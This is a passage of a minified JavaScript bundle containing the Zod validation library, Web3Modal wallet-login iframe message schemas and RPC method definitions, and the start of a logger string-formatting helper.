this._def.getter()._parse({data:t.data,path:t.path,parent:t})}}Uv.create=(r,e)=>new Uv({getter:r,typeName:hr.ZodLazy,...Sr(e)});class jv extends Rr{_parse(e){if(e.data!==this._def.value){const t=this._getOrReturnCtx(e);return Pt(t,{received:t.data,code:Je.invalid_literal,expected:this._def.value}),xr}return{status:"valid",value:e.data}}get value(){return this._def.value}}jv.create=(r,e)=>new jv({value:r,typeName:hr.ZodLiteral,...Sr(e)});function $J(r,e){return new op({values:r,typeName:hr.ZodEnum,...Sr(e)})}class op extends Rr{_parse(e){if(typeof e.data!="string"){const t=this._getOrReturnCtx(e),i=this._def.values;return Pt(t,{expected:bi.joinValues(i),received:t.parsedType,code:Je.invalid_type}),xr}if(this._def.values.indexOf(e.data)===-1){const t=this._getOrReturnCtx(e),i=this._def.values;return Pt(t,{received:t.data,code:Je.invalid_enum_value,options:i}),xr}return Jo(e.data)}get options(){return this._def.values}get enum(){const e={};for(const t of this._def.values)e[t]=t;return e}get Values(){const e={};for(const t of this._def.values)e[t]=t;return e}get Enum(){const e={};for(const t of this._def.values)e[t]=t;return e}extract(e){return op.create(e)}exclude(e){return op.create(this.options.filter(t=>!e.includes(t)))}}op.create=$J;class Fv extends Rr{_parse(e){const t=bi.getValidEnumValues(this._def.values),i=this._getOrReturnCtx(e);if(i.parsedType!==_t.string&&i.parsedType!==_t.number){const n=bi.objectValues(t);return Pt(i,{expected:bi.joinValues(n),received:i.parsedType,code:Je.invalid_type}),xr}if(t.indexOf(e.data)===-1){const n=bi.objectValues(t);return Pt(i,{received:i.data,code:Je.invalid_enum_value,options:n}),xr}return Jo(e.data)}get enum(){return this._def.values}}Fv.create=(r,e)=>new Fv({values:r,typeName:hr.ZodNativeEnum,...Sr(e)});class Aw extends Rr{unwrap(){return this._def.type}_parse(e){const{ctx:t}=this._processInputParams(e);if(t.parsedType!==_t.promise&&t.common.async===!1)return Pt(t,{code:Je.invalid_type,expected:_t.promise,received:t.parsedType}),xr;const i=t.parsedType===_t.promise?t.data:Promise.resolve(t.data);return Jo(i.then(n=>this._def.type.parseAsync(n,{path:t.path,errorMap:t.common.contextualErrorMap})))}}Aw.create=(r,e)=>new Aw({type:r,typeName:hr.ZodPromise,...Sr(e)});class pu extends Rr{innerType(){return this._def.schema}sourceType(){return this._def.schema._def.typeName===hr.ZodEffects?this._def.schema.sourceType():this._def.schema}_parse(e){const{status:t,ctx:i}=this._processInputParams(e),n=this._def.effect||null,s={addIssue:o=>{Pt(i,o),o.fatal?t.abort():t.dirty()},get path(){return i.path}};if(s.addIssue=s.addIssue.bind(s),n.type==="preprocess"){const o=n.transform(i.data,s);return i.common.issues.length?{status:"dirty",value:i.data}:i.common.async?Promise.resolve(o).then(a=>this._def.schema._parseAsync({data:a,path:i.path,parent:i})):this._def.schema._parseSync({data:o,path:i.path,parent:i})}if(n.type==="refinement"){const o=a=>{const c=n.refinement(a,s);if(i.common.async)return Promise.resolve(c);if(c instanceof Promise)throw new Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");return a};if(i.common.async===!1){const a=this._def.schema._parseSync({data:i.data,path:i.path,parent:i});return a.status==="aborted"?xr:(a.status==="dirty"&&t.dirty(),o(a.value),{status:t.value,value:a.value})}else return this._def.schema._parseAsync({data:i.data,path:i.path,parent:i}).then(a=>a.status==="aborted"?xr:(a.status==="dirty"&&t.dirty(),o(a.value).then(()=>({status:t.value,value:a.value}))))}if(n.type==="transform")if(i.common.async===!1){const o=this._def.schema._parseSync({data:i.data,path:i.path,parent:i});if(!$v(o))return o;const a=n.transform(o.value,s);if(a instanceof Promise)throw new Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");return{status:t.value,value:a}}else return this._def.schema._parseAsync({data:i.data,path:i.path,parent:i}).then(o=>$v(o)?Promise.resolve(n.transform(o.value,s)).then(a=>({status:t.value,value:a})):o);bi.assertNever(n)}}pu.create=(r,e,t)=>new pu({schema:r,typeName:hr.ZodEffects,effect:e,...Sr(t)});pu.createWithPreprocess=(r,e,t)=>new pu({schema:e,effect:{type:"preprocess",transform:r},typeName:hr.ZodEffects,...Sr(t)});class Xh extends Rr{_parse(e){return this._getType(e)===_t.undefined?Jo(void 0):this._def.innerType._parse(e)}unwrap(){return this._def.innerType}}Xh.create=(r,e)=>new Xh({innerType:r,typeName:hr.ZodOptional,...Sr(e)});class Y1 extends Rr{_parse(e){return this._getType(e)===_t.null?Jo(null):this._def.innerType._parse(e)}unwrap(){return this._def.innerType}}Y1.create=(r,e)=>new Y1({innerType:r,typeName:hr.ZodNullable,...Sr(e)});class qv extends Rr{_parse(e){const{ctx:t}=this._processInputParams(e);let i=t.data;return t.parsedType===_t.undefined&&(i=this._def.defaultValue()),this._def.innerType._parse({data:i,path:t.path,parent:t})}removeDefault(){return this._def.innerType}}qv.create=(r,e)=>new qv({innerType:r,typeName:hr.ZodDefault,defaultValue:typeof e.default=="function"?e.default:()=>e.default,...Sr(e)});class X9 extends Rr{_parse(e){const{ctx:t}=this._processInputParams(e),i={...t,common:{...t.common,issues:[]}},n=this._def.innerType._parse({data:i.data,path:i.path,parent:{...i}});return Z9(n)?n.then(s=>({status:"valid",value:s.status==="valid"?s.value:this._def.catchValue({get error(){return new du(i.common.issues)},input:i.data})})):{status:"valid",value:n.status==="valid"?n.value:this._def.catchValue({get error(){return new du(i.common.issues)},input:i.data})}}removeCatch(){return this._def.innerType}}X9.create=(r,e)=>new X9({innerType:r,typeName:hr.ZodCatch,catchValue:typeof e.catch=="function"?e.catch:()=>e.catch,...Sr(e)});class e7 extends Rr{_parse(e){if(this._getType(e)!==_t.nan){const i=this._getOrReturnCtx(e);return Pt(i,{code:Je.invalid_type,expected:_t.nan,received:i.parsedType}),xr}return{status:"valid",value:e.data}}}e7.create=r=>new e7({typeName:hr.ZodNaN,...Sr(r)});const Z1e=Symbol("zod_brand");class RJ extends Rr{_parse(e){const{ctx:t}=this._processInputParams(e),i=t.data;return this._def.type._parse({data:i,path:t.path,parent:t})}unwrap(){return this._def.type}}class s4 extends Rr{_parse(e){const{status:t,ctx:i}=this._processInputParams(e);if(i.common.async)return(async()=>{const s=await this._def.in._parseAsync({data:i.data,path:i.path,parent:i});return s.status==="aborted"?xr:s.status==="dirty"?(t.dirty(),PJ(s.value)):this._def.out._parseAsync({data:s.value,path:i.path,parent:i})})();{const n=this._def.in._parseSync({data:i.data,path:i.path,parent:i});return n.status==="aborted"?xr:n.status==="dirty"?(t.dirty(),{status:"dirty",value:n.value}):this._def.out._parseSync({data:n.value,path:i.path,parent:i})}}static create(e,t){return new s4({in:e,out:t,typeName:hr.ZodPipeline})}}class t7 extends Rr{_parse(e){const t=this._def.innerType._parse(e);return $v(t)&&(t.value=Object.freeze(t.value)),t}}t7.create=(r,e)=>new t7({innerType:r,typeName:hr.ZodReadonly,...Sr(e)});const OJ=(r,e={},t)=>r?Sw.create().superRefine((i,n)=>{var s,o;if(!r(i)){const a=typeof e=="function"?e(i):typeof e=="string"?{message:e}:e,c=(o=(s=a.fatal)!==null&&s!==void 0?s:t)!==null&&o!==void 0?o:!0,l=typeof a=="string"?{message:a}:a;n.addIssue({code:"custom",...l,fatal:c})}}):Sw.create(),Y1e={object:kn.lazycreate};var hr;(function(r){r.ZodString="ZodString",r.ZodNumber="ZodNumber",r.ZodNaN="ZodNaN",r.ZodBigInt="ZodBigInt",r.ZodBoolean="ZodBoolean",r.ZodDate="ZodDate",r.ZodSymbol="ZodSymbol",r.ZodUndefined="ZodUndefined",r.ZodNull="ZodNull",r.ZodAny="ZodAny",r.ZodUnknown="ZodUnknown",r.ZodNever="ZodNever",r.ZodVoid="ZodVoid",r.ZodArray="ZodArray",r.ZodObject="ZodObject",r.ZodUnion="ZodUnion",r.ZodDiscriminatedUnion="ZodDiscriminatedUnion",r.ZodIntersection="ZodIntersection",r.ZodTuple="ZodTuple",r.ZodRecord="ZodRecord",r.ZodMap="ZodMap",r.ZodSet="ZodSet",r.ZodFunction="ZodFunction",r.ZodLazy="ZodLazy",r.ZodLiteral="ZodLiteral",r.ZodEnum="ZodEnum",r.ZodEffects="ZodEffects",r.ZodNativeEnum="ZodNativeEnum",r.ZodOptional="ZodOptional",r.ZodNullable="ZodNullable",r.ZodDefault="ZodDefault",r.ZodCatch="ZodCatch",r.ZodPromise="ZodPromise",r.ZodBranded="ZodBranded",r.ZodPipeline="ZodPipeline",r.ZodReadonly="ZodReadonly"})(hr||(hr={}));const J1e=(r,e={message:`Input not instance of ${r.name}`})=>OJ(t=>t instanceof r,e),BJ=cu.create,MJ=np.create,Q1e=e7.create,X1e=sp.create,DJ=Rv.create,ege=G1.create,tge=Y9.create,rge=Ov.create,ige=Bv.create,nge=Sw.create,sge=M1.create,oge=l0.create,age=J9.create,cge=hu.create,lge=kn.create,uge=kn.strictCreate,dge=Mv.create,hge=eC.create,fge=Dv.create,pge=Pd.create,gge=Lv.create,mge=Q9.create,wge=Z1.create,bge=iw.create,vge=Uv.create,yge=jv.create,xge=op.create,Cge=Fv.create,Ege=Aw.create,xL=pu.create,_ge=Xh.create,Sge=Y1.create,Age=pu.createWithPreprocess,Ige=s4.create,Tge=()=>BJ().optional(),kge=()=>MJ().optional(),Nge=()=>DJ().optional(),Pge={string:r=>cu.create({...r,coerce:!0}),number:r=>np.create({...r,coerce:!0}),boolean:r=>Rv.create({...r,coerce:!0}),bigint:r=>sp.create({...r,coerce:!0}),date:r=>G1.create({...r,coerce:!0})},$ge=xr;var oe=Object.freeze({__proto__:null,defaultErrorMap:Pv,setErrorMap:M1e,getErrorMap:K9,makeIssue:G9,EMPTY_PATH:D1e,addIssueToContext:Pt,ParseStatus:Do,INVALID:xr,DIRTY:PJ,OK:Jo,isAborted:hk,isDirty:fk,isValid:$v,isAsync:Z9,get util(){return bi},get objectUtil(){return dk},ZodParsedType:_t,getParsedType:Af,ZodType:Rr,ZodString:cu,ZodNumber:np,ZodBigInt:sp,ZodBoolean:Rv,ZodDate:G1,ZodSymbol:Y9,ZodUndefined:Ov,ZodNull:Bv,ZodAny:Sw,ZodUnknown:M1,ZodNever:l0,ZodVoid:J9,ZodArray:hu,ZodObject:kn,ZodUnion:Mv,ZodDiscriminatedUnion:eC,ZodIntersection:Dv,ZodTuple:Pd,ZodRecord:Lv,ZodMap:Q9,ZodSet:Z1,ZodFunction:iw,ZodLazy:Uv,ZodLiteral:jv,ZodEnum:op,ZodNativeEnum:Fv,ZodPromise:Aw,ZodEffects:pu,ZodTransformer:pu,ZodOptional:Xh,ZodNullable:Y1,ZodDefault:qv,ZodCatch:X9,ZodNaN:e7,BRAND:Z1e,ZodBranded:RJ,ZodPipeline:s4,ZodReadonly:t7,custom:OJ,Schema:Rr,ZodSchema:Rr,late:Y1e,get ZodFirstPartyTypeKind(){return hr},coerce:Pge,any:nge,array:cge,bigint:X1e,boolean:DJ,date:ege,discriminatedUnion:hge,effect:xL,enum:xge,function:bge,instanceof:J1e,intersection:fge,lazy:vge,literal:yge,map:mge,nan:Q1e,nativeEnum:Cge,never:oge,null:ige,nullable:Sge,number:MJ,object:lge,oboolean:Nge,onumber:kge,optional:_ge,ostring:Tge,pipeline:Ige,preprocess:Age,promise:Ege,record:gge,set:wge,strictObject:uge,string:BJ,symbol:tge,transformer:xL,tuple:pge,undefined:rge,union:dge,unknown:sge,void:age,NEVER:$ge,ZodIssueCode:Je,quotelessJson:B1e,ZodError:du});const Bn=oe.object({message:oe.string()});function kt(r){return oe.literal(Dt[r])}oe.object({accessList:oe.array(oe.string()),blockHash:oe.string().nullable(),blockNumber:oe.string().nullable(),chainId:oe.string().or(oe.number()),from:oe.string(),gas:oe.string(),hash:oe.string(),input:oe.string().nullable(),maxFeePerGas:oe.string(),maxPriorityFeePerGas:oe.string(),nonce:oe.string(),r:oe.string(),s:oe.string(),to:oe.string(),transactionIndex:oe.string().nullable(),type:oe.string(),v:oe.string(),value:oe.string()});const Rge=oe.object({chainId:oe.string().or(oe.number())}),Oge=oe.object({email:oe.string().email()}),Bge=oe.object({otp:oe.string()}),Mge=oe.object({uri:oe.string()}),Dge=oe.object({chainId:oe.optional(oe.string().or(oe.number())),preferredAccountType:oe.optional(oe.string())}),Lge=oe.object({provider:oe.enum(["google","github","apple","facebook","x","discord"])}),Uge=oe.object({email:oe.string().email()}),jge=oe.object({otp:oe.string()}),Fge=oe.object({otp:oe.string()}),qge=oe.object({themeMode:oe.optional(oe.enum(["light","dark"])),themeVariables:oe.optional(oe.record(oe.string(),oe.string().or(oe.number()))),w3mThemeVariables:oe.optional(oe.record(oe.string(),oe.string()))}),zge=oe.object({metadata:oe.object({name:oe.string(),description:oe.string(),url:oe.string(),icons:oe.array(oe.string())}).optional(),sdkVersion:oe.string().optional(),sdkType:oe.string().optional(),projectId:oe.string()}),Wge=oe.object({type:oe.string()}),Hge=oe.object({action:oe.enum(["VERIFY_DEVICE","VERIFY_OTP","CONNECT"])}),Vge=oe.object({url:oe.string()}),Kge=oe.object({userName:oe.string()}),Gge=oe.object({email:oe.string(),address:oe.string(),chainId:oe.string().or(oe.number()),accounts:oe.array(oe.object({address:oe.string(),type:oe.enum([vr.ACCOUNT_TYPES.EOA,vr.ACCOUNT_TYPES.SMART_ACCOUNT])})).optional(),userName:oe.string().optional()}),Zge=oe.object({action:oe.enum(["VERIFY_PRIMARY_OTP","VERIFY_SECONDARY_OTP"])}),Yge=oe.object({email:oe.string().email().optional().nullable(),address:oe.string(),chainId:oe.string().or(oe.number()),smartAccountDeployed:oe.optional(oe.boolean()),accounts:oe.array(oe.object({address:oe.string(),type:oe.enum([vr.ACCOUNT_TYPES.EOA,vr.ACCOUNT_TYPES.SMART_ACCOUNT])})).optional(),preferredAccountType:oe.optional(oe.string())}),Jge=oe.object({uri:oe.string()}),Qge=oe.object({isConnected:oe.boolean()}),Xge=oe.object({chainId:oe.string().or(oe.number())}),e2e=oe.object({chainId:oe.string().or(oe.number())}),t2e=oe.object({newEmail:oe.string().email()}),r2e=oe.object({smartAccountEnabledNetworks:oe.array(oe.number())});oe.object({address:oe.string(),isDeployed:oe.boolean()});const i2e=oe.object({version:oe.string().optional()}),n2e=oe.object({type:oe.string(),address:oe.string()}),s2e=oe.any(),o2e=oe.object({method:oe.literal("eth_accounts")}),a2e=oe.object({method:oe.literal("eth_blockNumber")}),c2e=oe.object({method:oe.literal("eth_call"),params:oe.array(oe.any())}),l2e=oe.object({method:oe.literal("eth_chainId")}),u2e=oe.object({method:oe.literal("eth_estimateGas"),params:oe.array(oe.any())}),d2e=oe.object({method:oe.literal("eth_feeHistory"),params:oe.array(oe.any())}),h2e=oe.object({method:oe.literal("eth_gasPrice")}),f2e=oe.object({method:oe.literal("eth_getAccount"),params:oe.array(oe.any())}),p2e=oe.object({method:oe.literal("eth_getBalance"),params:oe.array(oe.any())}),g2e=oe.object({method:oe.literal("eth_getBlockByHash"),params:oe.array(oe.any())}),m2e=oe.object({method:oe.literal("eth_getBlockByNumber"),params:oe.array(oe.any())}),w2e=oe.object({method:oe.literal("eth_getBlockReceipts"),params:oe.array(oe.any())}),b2e=oe.object({method:oe.literal("eth_getBlockTransactionCountByHash"),params:oe.array(oe.any())}),v2e=oe.object({method:oe.literal("eth_getBlockTransactionCountByNumber"),params:oe.array(oe.any())}),y2e=oe.object({method:oe.literal("eth_getCode"),params:oe.array(oe.any())}),x2e=oe.object({method:oe.literal("eth_getFilterChanges"),params:oe.array(oe.any())}),C2e=oe.object({method:oe.literal("eth_getFilterLogs"),params:oe.array(oe.any())}),E2e=oe.object({method:oe.literal("eth_getLogs"),params:oe.array(oe.any())}),_2e=oe.object({method:oe.literal("eth_getProof"),params:oe.array(oe.any())}),S2e=oe.object({method:oe.literal("eth_getStorageAt"),params:oe.array(oe.any())}),A2e=oe.object({method:oe.literal("eth_getTransactionByBlockHashAndIndex"),params:oe.array(oe.any())}),I2e=oe.object({method:oe.literal("eth_getTransactionByBlockNumberAndIndex"),params:oe.array(oe.any())}),T2e=oe.object({method:oe.literal("eth_getTransactionByHash"),params:oe.array(oe.any())}),k2e=oe.object({method:oe.literal("eth_getTransactionCount"),params:oe.array(oe.any())}),N2e=oe.object({method:oe.literal("eth_getTransactionReceipt"),params:oe.array(oe.any())}),P2e=oe.object({method:oe.literal("eth_getUncleCountByBlockHash"),params:oe.array(oe.any())}),$2e=oe.object({method:oe.literal("eth_getUncleCountByBlockNumber"),params:oe.array(oe.any())}),R2e=oe.object({method:oe.literal("eth_maxPriorityFeePerGas")}),O2e=oe.object({method:oe.literal("eth_newBlockFilter")}),B2e=oe.object({method:oe.literal("eth_newFilter"),params:oe.array(oe.any())}),M2e=oe.object({method:oe.literal("eth_newPendingTransactionFilter")}),D2e=oe.object({method:oe.literal("eth_sendRawTransaction"),params:oe.array(oe.any())}),L2e=oe.object({method:oe.literal("eth_syncing"),params:oe.array(oe.any())}),U2e=oe.object({method:oe.literal("eth_uninstallFilter"),params:oe.array(oe.any())}),CL=oe.object({method:oe.literal("personal_sign"),params:oe.array(oe.any())}),j2e=oe.object({method:oe.literal("eth_signTypedData_v4"),params:oe.array(oe.any())}),F2e=oe.object({method:oe.literal("eth_sendTransaction"),params:oe.array(oe.any())}),q2e=oe.object({method:oe.literal("solana_signMessage"),params:oe.object({message:oe.string(),pubkey:oe.string()})}),z2e=oe.object({method:oe.literal("solana_signTransaction"),params:oe.object({transaction:oe.string()})}),W2e=oe.object({method:oe.literal("solana_signAllTransactions"),params:oe.object({transactions:oe.array(oe.string())})}),H2e=oe.object({method:oe.literal("solana_signAndSendTransaction"),params:oe.object({transaction:oe.string(),options:oe.object({skipPreflight:oe.boolean().optional(),preflightCommitment:oe.enum(["processed","confirmed","finalized","recent","single","singleGossip","root","max"]).optional(),maxRetries:oe.number().optional(),minContextSlot:oe.number().optional()}).optional()})}),V2e=oe.object({method:oe.literal("wallet_sendCalls"),params:oe.array(oe.object({chainId:oe.string().or(oe.number()).optional(),from:oe.string().optional(),version:oe.string().optional(),capabilities:oe.any().optional(),calls:oe.array(oe.object({to:oe.string().startsWith("0x"),data:oe.string().startsWith("0x").optional(),value:oe.string().optional()}))}))}),K2e=oe.object({method:oe.literal("wallet_getCallsStatus"),params:oe.array(oe.string())}),G2e=oe.object({method:oe.literal("wallet_getCapabilities")}),Z2e=oe.object({method:oe.literal("wallet_grantPermissions"),params:oe.array(oe.any())}),Y2e=oe.object({method:oe.literal("wallet_revokePermissions"),params:oe.any()}),J2e=oe.object({method:oe.literal("wallet_getAssets"),params:oe.any()}),EL=oe.object({token:oe.string()}),Nt=oe.object({id:oe.string().optional()}),hb={appEvent:Nt.extend({type:kt("APP_SWITCH_NETWORK"),payload:Rge}).or(Nt.extend({type:kt("APP_CONNECT_EMAIL"),payload:Oge})).or(Nt.extend({type:kt("APP_CONNECT_DEVICE")})).or(Nt.extend({type:kt("APP_CONNECT_OTP"),payload:Bge})).or(Nt.extend({type:kt("APP_CONNECT_SOCIAL"),payload:Mge})).or(Nt.extend({type:kt("APP_GET_FARCASTER_URI")})).or(Nt.extend({type:kt("APP_CONNECT_FARCASTER")})).or(Nt.extend({type:kt("APP_GET_USER"),payload:oe.optional(Dge)})).or(Nt.extend({type:kt("APP_GET_SOCIAL_REDIRECT_URI"),payload:Lge})).or(Nt.extend({type:kt("APP_SIGN_OUT")})).or(Nt.extend({type:kt("APP_IS_CONNECTED"),payload:oe.optional(EL)})).or(Nt.extend({type:kt("APP_GET_CHAIN_ID")})).or(Nt.extend({type:kt("APP_GET_SMART_ACCOUNT_ENABLED_NETWORKS")})).or(Nt.extend({type:kt("APP_INIT_SMART_ACCOUNT")})).or(Nt.extend({type:kt("APP_SET_PREFERRED_ACCOUNT"),payload:Wge})).or(Nt.extend({type:kt("APP_RPC_REQUEST"),payload:CL.or(J2e).or(o2e).or(a2e).or(c2e).or(l2e).or(u2e).or(d2e).or(h2e).or(f2e).or(p2e).or(g2e).or(m2e).or(w2e).or(b2e).or(v2e).or(y2e).or(x2e).or(C2e).or(E2e).or(_2e).or(S2e).or(A2e).or(I2e).or(T2e).or(k2e).or(N2e).or(P2e).or($2e).or(R2e).or(O2e).or(B2e).or(M2e).or(D2e).or(L2e).or(U2e).or(CL).or(j2e).or(F2e).or(q2e).or(z2e).or(W2e).or(H2e).or(K2e).or(V2e).or(G2e).or(Z2e).or(Y2e)})).or(Nt.extend({type:kt("APP_UPDATE_EMAIL"),payload:Uge})).or(Nt.extend({type:kt("APP_UPDATE_EMAIL_PRIMARY_OTP"),payload:jge})).or(Nt.extend({type:kt("APP_UPDATE_EMAIL_SECONDARY_OTP"),payload:Fge})).or(Nt.extend({type:kt("APP_SYNC_THEME"),payload:qge})).or(Nt.extend({type:kt("APP_SYNC_DAPP_DATA"),payload:zge})).or(Nt.extend({type:kt("APP_RELOAD")})),frameEvent:Nt.extend({type:kt("FRAME_SWITCH_NETWORK_ERROR"),payload:Bn}).or(Nt.extend({type:kt("FRAME_SWITCH_NETWORK_SUCCESS"),payload:e2e})).or(Nt.extend({type:kt("FRAME_CONNECT_EMAIL_SUCCESS"),payload:Hge})).or(Nt.extend({type:kt("FRAME_CONNECT_EMAIL_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_GET_FARCASTER_URI_SUCCESS"),payload:Vge})).or(Nt.extend({type:kt("FRAME_GET_FARCASTER_URI_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_CONNECT_FARCASTER_SUCCESS"),payload:Kge})).or(Nt.extend({type:kt("FRAME_CONNECT_FARCASTER_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_CONNECT_OTP_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_CONNECT_OTP_SUCCESS")})).or(Nt.extend({type:kt("FRAME_CONNECT_DEVICE_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_CONNECT_DEVICE_SUCCESS")})).or(Nt.extend({type:kt("FRAME_CONNECT_SOCIAL_SUCCESS"),payload:Gge})).or(Nt.extend({type:kt("FRAME_CONNECT_SOCIAL_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_GET_USER_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_GET_USER_SUCCESS"),payload:Yge})).or(Nt.extend({type:kt("FRAME_GET_SOCIAL_REDIRECT_URI_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_GET_SOCIAL_REDIRECT_URI_SUCCESS"),payload:Jge})).or(Nt.extend({type:kt("FRAME_SIGN_OUT_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_SIGN_OUT_SUCCESS")})).or(Nt.extend({type:kt("FRAME_IS_CONNECTED_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_IS_CONNECTED_SUCCESS"),payload:Qge})).or(Nt.extend({type:kt("FRAME_GET_CHAIN_ID_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_GET_CHAIN_ID_SUCCESS"),payload:Xge})).or(Nt.extend({type:kt("FRAME_RPC_REQUEST_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_RPC_REQUEST_SUCCESS"),payload:s2e})).or(Nt.extend({type:kt("FRAME_SESSION_UPDATE"),payload:EL})).or(Nt.extend({type:kt("FRAME_UPDATE_EMAIL_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_UPDATE_EMAIL_SUCCESS"),payload:Zge})).or(Nt.extend({type:kt("FRAME_UPDATE_EMAIL_PRIMARY_OTP_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_UPDATE_EMAIL_PRIMARY_OTP_SUCCESS")})).or(Nt.extend({type:kt("FRAME_UPDATE_EMAIL_SECONDARY_OTP_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_UPDATE_EMAIL_SECONDARY_OTP_SUCCESS"),payload:t2e})).or(Nt.extend({type:kt("FRAME_SYNC_THEME_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_SYNC_THEME_SUCCESS")})).or(Nt.extend({type:kt("FRAME_SYNC_DAPP_DATA_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_SYNC_DAPP_DATA_SUCCESS")})).or(Nt.extend({type:kt("FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_SUCCESS"),payload:r2e})).or(Nt.extend({type:kt("FRAME_GET_SMART_ACCOUNT_ENABLED_NETWORKS_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_INIT_SMART_ACCOUNT_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_SET_PREFERRED_ACCOUNT_SUCCESS"),payload:n2e})).or(Nt.extend({type:kt("FRAME_SET_PREFERRED_ACCOUNT_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_READY"),payload:i2e})).or(Nt.extend({type:kt("FRAME_RELOAD_ERROR"),payload:Bn})).or(Nt.extend({type:kt("FRAME_RELOAD_SUCCESS")}))};function iS(r,e={}){return typeof e?.type=="string"&&e?.type?.includes(r)}class Q2e{constructor({projectId:e,isAppClient:t=!1,chainId:i="eip155:1",enableLogger:n=!0}){if(this.iframe=null,this.rpcUrl=Me.BLOCKCHAIN_API_RPC_URL,this.initFrame=()=>{const s=document.getElementById("w3m-iframe");this.iframe&&!s&&document.body.appendChild(this.iframe)},this.events={registerFrameEventHandler:(s,o,a)=>{function c({data:l}){if(!iS(Dt.FRAME_EVENT_KEY,l))return;const u=hb.frameEvent.parse(l);u.id===s&&(o(u),window.removeEventListener("message",c))}Ro.isClient&&(window.addEventListener("message",c),a.addEventListener("abort",()=>{window.removeEventListener("message",c)}))},onFrameEvent:s=>{Ro.isClient&&window.addEventListener("message",({data:o})=>{if(!iS(Dt.FRAME_EVENT_KEY,o))return;const a=hb.frameEvent.parse(o);s(a)})},onAppEvent:s=>{Ro.isClient&&window.addEventListener("message",({data:o})=>{if(!iS(Dt.APP_EVENT_KEY,o))return;const a=hb.appEvent.parse(o);s(a)})},postAppEvent:s=>{if(Ro.isClient){if(!this.iframe?.contentWindow)throw new Error("W3mFrame: iframe is not set");hb.appEvent.parse(s),this.iframe.contentWindow.postMessage(s,"*")}},postFrameEvent:s=>{if(Ro.isClient){if(!parent)throw new Error("W3mFrame: parent is not set");hb.frameEvent.parse(s),parent.postMessage(s,"*")}}},this.projectId=e,this.frameLoadPromise=new Promise((s,o)=>{this.frameLoadPromiseResolver={resolve:s,reject:o}}),t&&(this.frameLoadPromise=new Promise((s,o)=>{this.frameLoadPromiseResolver={resolve:s,reject:o}}),Ro.isClient)){const s=document.createElement("iframe");s.id="w3m-iframe",s.src=`${$1e}?projectId=${e}&chainId=${i}&version=${O1e}&enableLogger=${n}`,s.name="w3m-secure-iframe",s.style.position="fixed",s.style.zIndex="999999",s.style.display="none",s.style.animationDelay="0s, 50ms",s.style.borderBottomLeftRadius="clamp(0px, var(--wui-border-radius-l), 44px)",s.style.borderBottomRightRadius="clamp(0px, var(--wui-border-radius-l), 44px)",this.iframe=s,this.iframe.onerror=()=>{this.frameLoadPromiseResolver?.reject("Unable to load email login dependency")},this.events.onFrameEvent(o=>{o.type==="@w3m-frame/READY"&&this.frameLoadPromiseResolver?.resolve(void 0)})}}get networks(){const e=["eip155:1","eip155:5","eip155:11155111","eip155:10","eip155:420","eip155:42161","eip155:421613","eip155:137","eip155:80001","eip155:42220","eip155:1313161554","eip155:1313161555","eip155:56","eip155:97","eip155:43114","eip155:43113","eip155:324","eip155:280","eip155:100","eip155:8453","eip155:84531","eip155:84532","eip155:7777777","eip155:999","solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp","solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z","solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1"].map(t=>({[t]:{rpcUrl:`${this.rpcUrl}/v1/?chainId=${t}&projectId=${this.projectId}`,chainId:t}}));return Object.assign({},...e)}}var nS,_L;function X2e(){if(_L)return nS;_L=1;function r(t){try{return JSON.stringify(t)}catch{return'"[Circular]"'}}nS=e;function e(t,i,n){var s=n&&n.stringify||r,o=1;if(typeof t=="object"&&t!==null){var a=i.length+o;if(a===1)return t;var c=new Array(a);c[0]=s(t);for(var l=1;l<a;l++)c[l]=s(i[l]);return c.join(" ")}if(typeof t!="string")return t;var u=i.length;if(u===0)return t;for(var d="",h=1-o,f=-1,p=t&&t.length||0,g=0;g<p;){if(t.charCodeAt(g)===37&&g+1<p){switch(f=f>-1?f:0,t.charCodeAt(g+1)){case 100:case 102:if(h>=u||i[h]==null)break;f<g&&(d+=t.slice(f,g)),d+=Number(i[h]),f=g+2,g++;break;case 105:if(h>=u||i[h]==null)break;f<g&&(d+=t.slice(f,g)),d+=Math.floor(Number(i[h])),f=g+2,g++;break;case 79:case 111:case 106:if(h>=u||i[h]===void 0)break;f<g&&(d+=t.slice(f,g));var w=typeof i[h];if(w==="string"){d+="'"+i[h]+"'",f=g+2,g++;break}if(w==="function"){d+=i[h].name||"<anonymous>",f=g+2,g++;break}d+=s(i[h]),f=g+2,g++;break;case 115:if(h>=u)break;f<g&&(d+=t.slice(f,g)),d+=String(i[h]),f=g+2,g++;break;case 37:f<g&&(d+=t.slice(f,g)),d+="%",f=g+2,g++,h--;break}++h}++g}return f===-1?t:(f<p&&(d+=t.slice(f)),d)}return nS}var sS,SL;function eme(){if(SL)return sS;SL=1;const r=X2e();sS=n;const e=k().console||{},t={mapHttpRequest:p,mapHttpResponse:p,wrapRequestSerializer:g,wrapResponseSerializer:g,wrapErrorSerializer:g,req:p,res:p,err:h};function i(I,E){return Array.isArray(I)?I.filter(function(N){return N!=="!stdSerializers.err"}):I===!0?Object.keys(E):!1}function n(I){I=I||{},I.browser=I.browser||{};const E=I.browser.transmit;if(E&&typeof E.send!="function")throw 